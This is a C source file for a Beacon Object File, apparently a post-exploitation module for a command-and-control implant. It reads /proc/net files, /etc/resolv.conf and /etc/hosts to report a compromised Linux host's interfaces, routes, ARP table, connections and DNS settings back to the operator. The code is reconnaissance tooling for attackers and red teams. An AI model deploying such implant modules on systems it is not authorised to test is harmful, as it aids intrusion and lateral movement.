/// net_enum.c — BOF: Network enumeration (interfaces, routes, ARP, DNS, connections)
/// Compile: gcc -c -o net_enum.o net_enum.c -include bof_api.h -Os -fPIC
/// Usage: execute bof net_enum.o

static void dump_file_section(const char *title, const char *path) {
    char *data = (char *)0;
    int len = AxReadFileToBuffer(path, &data, 131072);
    if (len > 0 && data) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n=== %s (%s) ===\n", title, path);
        BeaconOutput(CALLBACK_OUTPUT, data, len);
        if (data[len - 1] != '\n')
            BeaconOutput(CALLBACK_OUTPUT, "\n", 1);
        AxFree(data);
    }
}

static void parse_hex_ip(const char *hex, char *out, int out_size) {
    // Parse hex IP like "0100007F" → "127.0.0.1" (little-endian)
    unsigned int ip = 0;
    for (int i = 0; i < 8 && hex[i]; i++) {
        unsigned int nibble = 0;
        char c = hex[i];
        if (c >= '0' && c <= '9') nibble = c - '0';
        else if (c >= 'A' && c <= 'F') nibble = c - 'A' + 10;
        else if (c >= 'a' && c <= 'f') nibble = c - 'a' + 10;
        ip = (ip << 4) | nibble;
    }
    // Convert from network byte order (stored in little-endian hex)
    AxSnprintf(out, out_size, "%d.%d.%d.%d",
               ip & 0xFF, (ip >> 8) & 0xFF,
               (ip >> 16) & 0xFF, (ip >> 24) & 0xFF);
}

static int hex_to_int(const char *s, int len) {
    int val = 0;
    for (int i = 0; i < len && s[i]; i++) {
        unsigned int nibble = 0;
        char c = s[i];
        if (c >= '0' && c <= '9') nibble = c - '0';
        else if (c >= 'A' && c <= 'F') nibble = c - 'A' + 10;
        else if (c >= 'a' && c <= 'f') nibble = c - 'a' + 10;
        val = (val << 4) | nibble;
    }
    return val;
}

static const char *tcp_state_str(int state) {
    switch (state) {
        case 1:  return "ESTABLISHED";
        case 2:  return "SYN_SENT";
        case 3:  return "SYN_RECV";
        case 4:  return "FIN_WAIT1";
        case 5:  return "FIN_WAIT2";
        case 6:  return "TIME_WAIT";
        case 7:  return "CLOSE";
        case 8:  return "CLOSE_WAIT";
        case 9:  return "LAST_ACK";
        case 10: return "LISTEN";
        case 11: return "CLOSING";
        default: return "UNKNOWN";
    }
}

static void parse_tcp_connections(const char *path, const char *proto) {
    char *data = (char *)0;
    int len = AxReadFileToBuffer(path, &data, 524288);
    if (len <= 0 || !data) return;

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== %s connections (%s) ===\n", proto, path);
    BeaconPrintf(CALLBACK_OUTPUT, "  %-6s %-22s %-22s %-15s %-6s\n",
                 "IDX", "LOCAL", "REMOTE", "STATE", "UID");

    char *line = data;
    int line_num = 0;

    while (line < data + len) {
        char *eol = line;
        while (eol < data + len && *eol != '\n') eol++;

        line_num++;
        if (line_num == 1) { // Skip header
            line = eol + 1;
            continue;
        }

        // Parse: idx: local_addr:port remote_addr:port state ... uid
        // Skip leading whitespace
        char *p = line;
        while (p < eol && (*p == ' ' || *p == '\t')) p++;

        // Find fields by scanning for colons and spaces
        // Format: "   0: 0100007F:0035 00000000:0000 0A 00000000:00000000 ..."
        // Simple approach: find key hex fields
        char *colon1 = AxStrchr(p, ':');
        if (!colon1 || colon1 >= eol) { line = eol + 1; continue; }

        // Local address starts after first ": "
        char *local_start = colon1 + 2;
        char *local_colon = AxStrchr(local_start, ':');
        if (!local_colon || local_colon >= eol) { line = eol + 1; continue; }

        char local_ip_hex[16];
        int lip_len = (int)(local_colon - local_start);
        if (lip_len > 15) lip_len = 15;
        AxMemcpy(local_ip_hex, local_start, lip_len);
        local_ip_hex[lip_len] = '\0';

        int local_port = hex_to_int(local_colon + 1, 4);

        // Remote address
        char *space_after_local = local_colon + 5;
        while (space_after_local < eol && *space_after_local == ' ') space_after_local++;
        char *remote_colon = AxStrchr(space_after_local, ':');
        if (!remote_colon || remote_colon >= eol) { line = eol + 1; continue; }

        char remote_ip_hex[16];
        int rip_len = (int)(remote_colon - space_after_local);
        if (rip_len > 15) rip_len = 15;
        AxMemcpy(remote_ip_hex, space_after_local, rip_len);
        remote_ip_hex[rip_len] = '\0';

        int remote_port = hex_to_int(remote_colon + 1, 4);

        // State (2 hex chars after remote port + space)
        char *state_start = remote_colon + 6;
        while (state_start < eol && *state_start == ' ') state_start++;
        int state = hex_to_int(state_start, 2);

        // Convert IPs
        char local_ip[32], remote_ip[32];
        parse_hex_ip(local_ip_hex, local_ip, sizeof(local_ip));
        parse_hex_ip(remote_ip_hex, remote_ip, sizeof(remote_ip));

        char local_str[40], remote_str[40];
        AxSnprintf(local_str, sizeof(local_str), "%s:%d", local_ip, local_port);
        AxSnprintf(remote_str, sizeof(remote_str), "%s:%d", remote_ip, remote_port);

        BeaconPrintf(CALLBACK_OUTPUT, "  %-6d %-22s %-22s %-15s\n",
                     line_num - 1, local_str, remote_str, tcp_state_str(state));

        line = eol + 1;
    }
    AxFree(data);
}

static void parse_arp_table(void) {
    char *data = (char *)0;
    int len = AxReadFileToBuffer("/proc/net/arp", &data, 65536);
    if (len <= 0 || !data) return;

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== ARP table ===\n");
    BeaconOutput(CALLBACK_OUTPUT, data, len);
    AxFree(data);
}

static void parse_dns(void) {
    char *data = (char *)0;
    int len = AxReadFileToBuffer("/etc/resolv.conf", &data, 8192);
    if (len > 0 && data) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n=== DNS configuration ===\n");
        // Show only nameserver and search/domain lines
        char *line = data;
        while (line < data + len) {
            char *eol = line;
            while (eol < data + len && *eol != '\n') eol++;
            int llen = (int)(eol - line);

            if (llen > 0 && line[0] != '#') {
                if (AxStrncmp(line, "nameserver", 10) == 0 ||
                    AxStrncmp(line, "search", 6) == 0 ||
                    AxStrncmp(line, "domain", 6) == 0) {
                    char lbuf[256];
                    if (llen > 255) llen = 255;
                    AxMemcpy(lbuf, line, llen);
                    lbuf[llen] = '\0';
                    BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", lbuf);
                }
            }
            line = eol + 1;
        }
        AxFree(data);
    }
}

void go(char *args, int args_len) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Network enumeration\n");

    // Interfaces
    dump_file_section("Network interfaces", "/proc/net/dev");

    // Routes
    dump_file_section("Routing table", "/proc/net/route");

    // IPv6 routes (if present)
    dump_file_section("IPv6 routes", "/proc/net/ipv6_route");

    // ARP
    parse_arp_table();

    // DNS
    parse_dns();

    // TCP connections
    parse_tcp_connections("/proc/net/tcp", "TCP");

    // UDP listeners
    dump_file_section("UDP sockets", "/proc/net/udp");

    // TCP6
    parse_tcp_connections("/proc/net/tcp6", "TCP6");

    // Listening ports summary
    BeaconPrintf(CALLBACK_OUTPUT, "\n=== /etc/hosts ===\n");
    char *hosts = (char *)0;
    int hosts_len = AxReadFileToBuffer("/etc/hosts", &hosts, 8192);
    if (hosts_len > 0 && hosts) {
        BeaconOutput(CALLBACK_OUTPUT, hosts, hosts_len);
        AxFree(hosts);
    }

    // Hostname
    char *hostname = (char *)0;
    int hn_len = AxReadFileToBuffer("/proc/sys/kernel/hostname", &hostname, 256);
    if (hn_len > 0 && hostname) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Hostname: %s", hostname);
        AxFree(hostname);
    }

    // Domain
    char *domain = (char *)0;
    int dm_len = AxReadFileToBuffer("/proc/sys/kernel/domainname", &domain, 256);
    if (dm_len > 0 && domain) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Domain: %s", domain);
        AxFree(domain);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Network enumeration complete\n");
}
